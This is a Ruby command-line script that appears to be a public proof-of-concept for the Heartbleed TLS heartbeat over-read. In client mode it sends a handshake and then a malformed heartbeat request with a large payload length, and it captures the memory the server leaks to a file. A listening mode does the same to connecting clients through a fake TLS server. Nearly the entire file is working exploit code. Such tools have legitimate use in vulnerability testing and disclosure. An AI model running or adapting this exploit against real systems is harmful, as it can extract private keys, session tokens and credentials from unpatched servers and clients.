#!/usr/bin/env ruby
# encoding: ASCII-8BIT
# By Ramon de C Valle. This work is dedicated to the public domain.

require 'optparse'
require 'socket'

Version = [0, 0, 1]
Release = nil

client_hello =
    "\x16"+ # handshake
    "\x03\x01"+
    "\x00\x9a"+
    "\x01"+ # client_hello
    "\x00\x00\x96"+
    "\x03\x01"+
    "\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00"+
    "\x00\x68"+
    "\xc0\x14"+
    "\xc0\x13"+
    "\xc0\x12"+
    "\xc0\x11"+
    "\xc0\x10"+
    "\xc0\x0f"+
    "\xc0\x0e"+
    "\xc0\x0d"+
    "\xc0\x0c"+
    "\xc0\x0b"+
    "\xc0\x0a"+
    "\xc0\x09"+
    "\xc0\x08"+
    "\xc0\x07"+
    "\xc0\x06"+
    "\xc0\x05"+
    "\xc0\x04"+
    "\xc0\x03"+
    "\xc0\x02"+
    "\xc0\x01"+
    "\x00\x39"+
    "\x00\x38"+
    "\x00\x37"+
    "\x00\x36"+
    "\x00\x35"+
    "\x00\x33"+
    "\x00\x32"+
    "\x00\x31"+
    "\x00\x30"+
    "\x00\x2f"+
    "\x00\x16"+
    "\x00\x15"+
    "\x00\x14"+
    "\x00\x13"+
    "\x00\x12"+
    "\x00\x11"+
    "\x00\x10"+
    "\x00\x0f"+
    "\x00\x0e"+
    "\x00\x0d"+
    "\x00\x0c"+
    "\x00\x0b"+
    "\x00\x0a"+
    "\x00\x09"+
    "\x00\x08"+
    "\x00\x07"+
    "\x00\x06"+
    "\x00\x05"+
    "\x00\x04"+
    "\x00\x03"+
    "\x00\x02"+
    "\x00\x01"+
    "\x01"+
    "\x00"+
    "\x00\x05"+
    "\x00\x0f"+
    "\x00\x01"+
    "\x01"

server_hello =
    "\x16"+ # handshake
    "\x03\x01"+
    "\x00\x31"+
    "\x02"+ # server_hello
    "\x00\x00\x2d"+
    "\x03\x01"+
    "\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00"+
    "\x00\x00"+
    "\x00"+
    "\x00\x05"+
    "\x00\x0f"+
    "\x00\x01"+
    "\x01"

heartbeat_request =
    "\x18"+ # heartbeat
    "\x03\x01"+
    "\x00\x03"+
    "\x01"+ # heartbeat_request
    "\xff\xff"

class String
  def hexdump(stream=$stdout)
    0.step(bytesize - 1, 16) do |i|
      stream.printf('%08x  ', i)

      0.upto(15) do |j|
        stream.printf(' ') if j == 8

        if i + j >= bytesize
          stream.printf('   ')
        else
          stream.printf('%02x ', getbyte(i + j))
        end
      end

      stream.printf(' ')

      0.upto(15) do |j|
        if i + j >= bytesize
          stream.printf(' ')
        else
          if /[[:print:]]/ === getbyte(i + j).chr && /[^[:space:]]/ === getbyte(i + j).chr
            stream.printf('%c', getbyte(i + j))
          else
            stream.printf('.')
          end
        end
      end

      stream.printf("\n")
    end
  end
end

options = {}

OptionParser.new do |parser|
  parser.banner = "Usage: #{parser.program_name} [options] host"
  parser.banner << "\n#{parser.program_name} -l [options] [host]"

  parser.separator('')
  parser.separator('Options:')

  parser.on('-0', '--TLSv1.0', 'Use TLS version 1.0 (default)') do
    client_hello[10] = "\x01"
  end

  parser.on('-1', '--TLSv1.1', 'Use TLS version 1.1') do
    client_hello[10] = "\x02"
  end

  parser.on('-2', '--TLSv1.2', 'Use TLS version 1.2') do
    client_hello[10] = "\x03"
  end

  parser.on('-3', '--SSLv3.0', 'Use SSL version 3.0') do
    client_hello[2] = client_hello[10] = "\x00"
  end

  parser.on('-L', '--length LENGTH', 'Specify the payload length in bytes') do |length|
    heartbeat_request[6, 2] = [length].pack('n')
  end

  parser.on('-d', '--debug', 'Debug mode') do
    options[:debug] = true
  end

  parser.on('-h', '--help', 'Show this message') do
    puts parser
    exit
  end

  parser.on('-l', '--listen', 'Listening mode') do |l|
    options[:listening] = l
  end

  parser.on('-o', '--output FILE', 'Specify the output file') do |file|
    options[:file] = File.new(file, 'w+b')
  end

  parser.on('-p', '--port PORT', 'Port') do |port|
    options[:port] = port
  end

  parser.on('-t', '--timeout TIMEOUT', 'Specify the timeout, in seconds') do |timeout|
    options[:timeout] = timeout.to_i
  end

  parser.on('-v', '--verbose', 'Verbose mode') do
    options[:verbose] = true
  end

  parser.on('--version', 'Show version') do
    puts parser.ver
    exit
  end
end.parse!

debug = options[:debug] || false
listening = options[:listening] || false
file = options[:file] || nil
verbose = options[:verbose] || false

case listening
when false
  host = ARGV[0] or fail ArgumentError, 'no host given'
  port = options[:port] || 443
  timeout = options[:timeout] || 5
  heartbeat_sent = false

  socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM)
  sockaddr = Socket.pack_sockaddr_in(port, host)

  begin
    socket.connect_nonblock(sockaddr)

  rescue IO::WaitWritable
    IO.select(nil, [socket], nil, timeout) or fail Errno::ETIMEDOUT

    begin
      socket.connect_nonblock(sockaddr) # check for connection failure

    rescue Errno::EISCONN
    end
  end

  puts 'Connected to %s:%d' % [host, port] if debug || verbose

  # gmt_unix_time
  client_hello[11, 4] = [Time.new.to_i].pack('N')

  # random_bytes
  client_hello[15, 28] = Random.new(Time.new.to_i).bytes(28)

  count = socket.write(client_hello)
  client_hello.hexdump($stderr) if debug
  puts '%d bytes sent' % [count] if debug || verbose

  loop do
    readable, = IO.select([socket])

    readable.each do |r|
      data = r.readpartial(16384)
      data.hexdump($stderr) if debug
      puts '%d bytes received' % [data.bytesize] if debug || verbose

      if heartbeat_sent
        if file
          file.write(data)
          file.flush
          file.fsync
        end
      elsif data =~ /\x16\x03([\x00-\x03])\x00\x04\x0e\x00\x00\x00/ # server_hello_done
        # Use the protocol version sent by the server
        heartbeat_request[2] = $1

        count = socket.write(heartbeat_request)
        heartbeat_request.hexdump($stderr) if debug
        puts '%d bytes sent' % [count] if debug || verbose

        debug = true
        heartbeat_sent = true
      end
    end
  end

  socket.close

when true
  host = ARGV[0] || '0.0.0.0'
  port = options[:port] || 443

  server = TCPServer.new(host, port)
  puts 'Listening on %s:%d' % [server.addr[2], server.addr[1]] if debug || verbose

  loop do
    Thread.start(server.accept) do |client|
      puts 'Accepted connection from %s:%d' % [client.peeraddr[2], client.peeraddr[1]] if debug || verbose

      heartbeat_sent = false

      loop do
        readable, = IO.select([client])

        readable.each do |r|
          data = r.readpartial(16384)
          data.hexdump($stderr) if debug
          puts '%d bytes received' % [data.bytesize] if debug || verbose

          if heartbeat_sent
            if file
              file.write(data)
              file.flush
              file.fsync
            end
          elsif pos = data =~ /\x16\x03[\x00-\x03]..\x01...\x03([\x00-\x03])/ # client_hello
            # Use the protocol version sent by the client. This should be
            # the latest version supported by the client, which may also
            # be the only acceptable.
            server_hello[2] = server_hello[10] = $1

            # gmt_unix_time
            server_hello[11, 4] = [Time.new.to_i].pack('N')

            # random_bytes
            server_hello[15, 28] = Random.new(Time.new.to_i).bytes(28)

            # Use the first cipher suite sent by the client
            server_hello[44, 2] = data[pos + 46, 2]

            count = client.write(server_hello)
            server_hello.hexdump($stderr) if debug
            puts '%d bytes sent' % [count] if debug || verbose

            # Use the protocol version sent by the client
            heartbeat_request[2] = $1

            count = client.write(heartbeat_request)
            heartbeat_request.hexdump($stderr) if debug
            puts '%d bytes sent' % [count] if debug || verbose

            debug = true
            heartbeat_sent = true
          end
        end
      end

      client.close
    end
  end

  server.close
end
